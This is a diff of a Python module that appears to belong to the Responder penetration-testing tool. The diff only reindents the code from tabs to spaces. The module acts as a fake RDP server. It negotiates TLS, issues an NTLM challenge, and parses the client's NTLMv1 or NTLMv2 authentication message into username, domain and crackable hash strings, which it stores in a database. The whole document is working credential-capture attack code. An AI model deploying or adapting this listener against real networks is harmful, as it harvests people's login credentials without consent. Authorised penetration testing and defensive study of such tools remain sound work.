@@ -28,112 +28,112 @@ cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
 key =  os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)
 
 def ParseNTLMHash(data,client, Challenge):  #Parse NTLMSSP v1/v2
-	SSPIStart  = data.find(b'NTLMSSP')
-	SSPIString = data[SSPIStart:]
-	LMhashLen    = struct.unpack('<H',data[SSPIStart+14:SSPIStart+16])[0]
-	LMhashOffset = struct.unpack('<H',data[SSPIStart+16:SSPIStart+18])[0]
-	LMHash       = SSPIString[LMhashOffset:LMhashOffset+LMhashLen]
-	LMHash	     = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
-	NthashLen    = struct.unpack('<H',data[SSPIStart+20:SSPIStart+22])[0]
-	NthashOffset = struct.unpack('<H',data[SSPIStart+24:SSPIStart+26])[0]
+    SSPIStart  = data.find(b'NTLMSSP')
+    SSPIString = data[SSPIStart:]
+    LMhashLen    = struct.unpack('<H',data[SSPIStart+14:SSPIStart+16])[0]
+    LMhashOffset = struct.unpack('<H',data[SSPIStart+16:SSPIStart+18])[0]
+    LMHash       = SSPIString[LMhashOffset:LMhashOffset+LMhashLen]
+    LMHash       = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
+    NthashLen    = struct.unpack('<H',data[SSPIStart+20:SSPIStart+22])[0]
+    NthashOffset = struct.unpack('<H',data[SSPIStart+24:SSPIStart+26])[0]
 
-	if NthashLen == 24:
-		SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
-		SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
-		DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
-		DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
-		Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
-		UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
-		UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
-		Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
-		WriteHash = f"{Username}::{Domain}:{LMHash}:{SMBHash}:{codecs.encode(Challenge, 'hex').decode('latin-1')}"
+    if NthashLen == 24:
+        SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
+        SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
+        DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
+        DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
+        Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
+        UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
+        UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
+        Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
+        WriteHash = f"{Username}::{Domain}:{LMHash}:{SMBHash}:{codecs.encode(Challenge, 'hex').decode('latin-1')}"
 
-		SaveToDb({
-			'module': 'RDP', 
-			'type': 'NTLMv1-SSP', 
-			'client': client, 
-			'user': Domain+'\\'+Username, 
-			'hash': SMBHash, 
-			'fullhash': WriteHash,
-		})
+        SaveToDb({
+            'module': 'RDP', 
+            'type': 'NTLMv1-SSP', 
+            'client': client, 
+            'user': Domain+'\\'+Username, 
+            'hash': SMBHash, 
+            'fullhash': WriteHash,
+        })
 
-	if NthashLen > 60:
-		SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
-		SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
-		DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
-		DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
-		Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
-		UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
-		UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
-		Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
-		WriteHash = f"{Username}::{Domain}:{codecs.encode(Challenge, 'hex').decode('latin-1')}:{SMBHash[:32]}:{SMBHash[32:]}"
+    if NthashLen > 60:
+        SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
+        SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
+        DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
+        DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
+        Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
+        UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
+        UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
+        Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
+        WriteHash = f"{Username}::{Domain}:{codecs.encode(Challenge, 'hex').decode('latin-1')}:{SMBHash[:32]}:{SMBHash[32:]}"
 
-		SaveToDb({
-			'module': 'RDP', 
-			'type': 'NTLMv2-SSP', 
-			'client': client, 
-			'user': Domain+'\\'+Username, 
-			'hash': SMBHash, 
-			'fullhash': WriteHash,
-		})
+        SaveToDb({
+            'module': 'RDP', 
+            'type': 'NTLMv2-SSP', 
+            'client': client, 
+            'user': Domain+'\\'+Username, 
+            'hash': SMBHash, 
+            'fullhash': WriteHash,
+        })
 
 
 def FindNTLMNegoStep(data):
-	NTLMStart  = data.find(b'NTLMSSP')
-	NTLMString = data[NTLMStart:]
-	NTLMStep = NTLMString[8:12]
-	if NTLMStep == b'\x01\x00\x00\x00':
-		return NTLMStep
-	return NTLMStep if NTLMStep == b'\x03\x00\x00\x00' else False
+    NTLMStart  = data.find(b'NTLMSSP')
+    NTLMString = data[NTLMStart:]
+    NTLMStep = NTLMString[8:12]
+    if NTLMStep == b'\x01\x00\x00\x00':
+        return NTLMStep
+    return NTLMStep if NTLMStep == b'\x03\x00\x00\x00' else False
 
 class RDP(BaseRequestHandler):
-	def handle(self):
-		try:
-			data = self.request.recv(1024)
-			self.request.settimeout(30)
-			Challenge = RandomChallenge()
+    def handle(self):
+        try:
+            data = self.request.recv(1024)
+            self.request.settimeout(30)
+            Challenge = RandomChallenge()
 
-			cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
-			key =  os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)
-			context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-			context.load_cert_chain(cert, key)
+            cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
+            key =  os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            context.load_cert_chain(cert, key)
 
-			if data[11:12] == b'\x01':
-				x =  X224(Data=RDPNEGOAnswer())
-				x.calculate()
-				h = TPKT(Data=x)
-				h.calculate()
-				buffer1 = str(h)
-				self.request.send(NetworkSendBufferPython2or3(buffer1))
-				SSLsock = context.wrap_socket(self.request, server_side=True)
-				SSLsock.settimeout(30)
-				data = SSLsock.read(8092)
-				if FindNTLMNegoStep(data) == b'\x01\x00\x00\x00':
-					x = RDPNTLMChallengeAnswer(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
-					x.calculate()
-					SSLsock.write(NetworkSendBufferPython2or3(x))
-					data = SSLsock.read(8092)
-					if FindNTLMNegoStep(data) == b'\x03\x00\x00\x00':
-						ParseNTLMHash(data,self.client_address[0], Challenge)
+            if data[11:12] == b'\x01':
+                x =  X224(Data=RDPNEGOAnswer())
+                x.calculate()
+                h = TPKT(Data=x)
+                h.calculate()
+                buffer1 = str(h)
+                self.request.send(NetworkSendBufferPython2or3(buffer1))
+                SSLsock = context.wrap_socket(self.request, server_side=True)
+                SSLsock.settimeout(30)
+                data = SSLsock.read(8092)
+                if FindNTLMNegoStep(data) == b'\x01\x00\x00\x00':
+                    x = RDPNTLMChallengeAnswer(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
+                    x.calculate()
+                    SSLsock.write(NetworkSendBufferPython2or3(x))
+                    data = SSLsock.read(8092)
+                    if FindNTLMNegoStep(data) == b'\x03\x00\x00\x00':
+                        ParseNTLMHash(data,self.client_address[0], Challenge)
 
-			if data[len(data) - 4 :] != b'\x03\x00\x00\x00':
-				return False
-			x =  X224(Data=RDPNEGOAnswer())
-			x.calculate()
-			h = TPKT(Data=x)
-			h.calculate()
-			buffer1 = str(h)
-			self.request.send(NetworkSendBufferPython2or3(buffer1))
-			data = self.request.recv(8092)
-			SSLsock = context.wrap_socket(self.request, server_side=True)
-			data = SSLsock.read(8092)
-			if FindNTLMNegoStep(data) == b'\x01\x00\x00\x00':
-				x = RDPNTLMChallengeAnswer(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
-				x.calculate()
-				SSLsock.write(NetworkSendBufferPython2or3(x))
-				data = SSLsock.read(8092)
-				if FindNTLMNegoStep(data) == b'\x03\x00\x00\x00':
-					ParseNTLMHash(data,self.client_address[0], Challenge)
+            if data[len(data) - 4 :] != b'\x03\x00\x00\x00':
+                return False
+            x =  X224(Data=RDPNEGOAnswer())
+            x.calculate()
+            h = TPKT(Data=x)
+            h.calculate()
+            buffer1 = str(h)
+            self.request.send(NetworkSendBufferPython2or3(buffer1))
+            data = self.request.recv(8092)
+            SSLsock = context.wrap_socket(self.request, server_side=True)
+            data = SSLsock.read(8092)
+            if FindNTLMNegoStep(data) == b'\x01\x00\x00\x00':
+                x = RDPNTLMChallengeAnswer(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
+                x.calculate()
+                SSLsock.write(NetworkSendBufferPython2or3(x))
+                data = SSLsock.read(8092)
+                if FindNTLMNegoStep(data) == b'\x03\x00\x00\x00':
+                    ParseNTLMHash(data,self.client_address[0], Challenge)
 
-		except Exception:
-			pass
+        except Exception:
+            pass
